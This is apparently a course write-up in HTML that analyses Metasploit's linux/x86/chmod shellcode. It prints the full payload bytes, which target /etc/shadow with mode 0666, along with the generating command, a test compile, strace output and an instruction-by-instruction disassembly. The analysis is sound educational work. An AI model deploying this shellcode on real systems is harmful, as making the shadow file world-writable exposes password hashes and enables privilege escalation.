@@ -1,0 +1,164 @@
+<h4>Assignment #5.2</h4>
+<p>
+	For Assignment 5.2 I have selected the simple chmod() payload which will
+	attempt to change POSIX permissions on a specified file. The following
+	shellcode has been generated for C with the following command and output:
+</p>
+<pre class="prettyprint linenums">
+$ msfpayload linux/x86/chmod C
+/*
+ * linux/x86/chmod - 36 bytes
+ * http://www.metasploit.com
+ * VERBOSE=false, PrependSetresuid=false, 
+ * PrependSetreuid=false, PrependSetuid=false, 
+ * PrependSetresgid=false, PrependSetregid=false, 
+ * PrependSetgid=false, PrependChrootBreak=false, 
+ * AppendExit=false, FILE=/etc/shadow, MODE=0666
+ */
+unsigned char buf[] = 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
+"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
+"\x80\x6a\x01\x58\xcd\x80";
+$
+</pre>
+<p>
+	To begin I have loaded this code into the shellcode.c
+	program for testing and compiled the code with:
+</p>
+<pre class="prettyprint linenums">
+gcc -ggdb -z execstack -fno-stack-protector shellcode.c -o sc
+</pre>
+<p>
+	If I run the program through strace from a sandbox'd
+	user account to be sure it does what it says on the box:
+</p>
+<pre class="prettyprint linenums">
+chmod("/etc/shadow", 0666)              = -1 EPERM (Operation not permitted)
+_exit(-1081157343)                      = ?
+</pre>
+<p>
+	So we can see here a chmod() call, and an exit() call.
+	Let's take a look at the code in ndisasm
+</p>
+<pre class="prettyprint linenums">
+$ msfpayload linux/x86/chmod R | ndisasm -u -
+00000000  99                cdq
+00000001  6A0F              push byte +0xf
+00000003  58                pop eax
+00000004  52                push edx
+00000005  E80C000000        call dword 0x16
+0000000A  2F                das
+0000000B  657463            gs jz 0x71
+0000000E  2F                das
+0000000F  7368              jnc 0x79
+00000011  61                popad
+00000012  646F              fs outsd
+00000014  7700              ja 0x16
+00000016  5B                pop ebx
+00000017  68B6010000        push dword 0x1b6
+0000001C  59                pop ecx
+0000001D  CD80              int 0x80
+0000001F  6A01              push byte +0x1
+00000021  58                pop eax
+00000022  CD80              int 0x80
+$
+</pre>
+<p>
+	Based on the analysis presented in 5.1 we can already
+	see an obvious pattern to the metasploit shellcode.
+</p>
+<p>
+	This code is clearing the registers and setting up
+	a syscall (0xf is 15, which is defined as __NR_chmod
+	in /usr/include/i386-linux-gnu/asm/unistd_32.h)
+</p>
+<pre class="prettyprint">
+00000000  99                cdq
+00000001  6A0F              push byte +0xf
+00000003  58                pop eax
+00000004  52                push edx
+</pre>
+<p>
+        The man 2 chmod page defines chmod as:
+</p>
+<pre class="prettyprint">
+int chmod(const char *path, mode_t mode);
+</pre>
+<p>
+	Here, once again, we call over a number of bytes
+	to continue the code to create our chmod arguments
+</p>
+<p>
+	Before we look at the code, the stack currently
+	has a single null on it. However, after the call
+	we know from previous experience that the stack
+	will also point to the bytes between 0x5 and 0x16
+</p>
+<pre class="prettyprint">
+00000005  E80C000000        call dword 0x16
+...
+00000016  5B                pop ebx
+00000017  68B6010000        push dword 0x1b6
+0000001C  59                pop ecx
+0000001D  CD80              int 0x80
+</pre>
+<p>
+	So EBX now points to whatever was after call and
+	before pop, as well as the null that we pushd from
+	EDX earlier. 0x1b6 is the OR bitmask for 666
+	permissions.
+</p>
+<p>
+	This simple code leaves us with ECX pointing to the
+	chmod bitmask, and ebx pointing to the path. EAX, of
+	course, contains the syscall to 0xF for chmod.
+</p>
+<p>
+	What did we miss? ndisasm makes it a lot easier to
+	see the actual bytes that match up to our shellcode.
+</p>
+<pre class="prettyprint">
+0000000A  2F                das
+0000000B  657463            gs jz 0x71
+0000000E  2F                das
+0000000F  7368              jnc 0x79
+00000011  61                popad
+00000012  646F              fs outsd
+00000014  7700              ja 0x16
+</pre>
+<p>
+	Which are these bytes in our C print out:
+</p>
+<pre class="prettyprint">
+\x2f\x65\x74\x63		; /etc
+\x2f\x73\x68\x61\x64\x6f\x77	; /shadow
+\x00				; null
+</pre>
+<p>
+	Once again, using the call method, the metasploit
+	payload has set up the stack so that our string
+	is available without any major pushing around.
+</p>
+<p>
+	If, however, we run the same code through sctest
+	we will again see that the LibEMU system can not
+	determine what we are chmod()ing, only that we
+	are doing it.
+</p>
+<p>
+	Before we look at the call graph though, the
+	last few bytes of our dump are here:
+</p>
+<pre class="prettyprint">
+0000001F  6A01              push byte +0x1
+00000021  58                pop eax
+00000022  CD80              int 0x80
+</pre>
+<p>
+	This is a standard exit() call with a return value
+	of whatever EBX happens to be holding at the time.
+</p>
+<div class="pagination-centered">
+	<img src="<?php echo base_url(); ?>/exam/slae-431-5.2.png" title="LibEMU output" />
+</div>
+
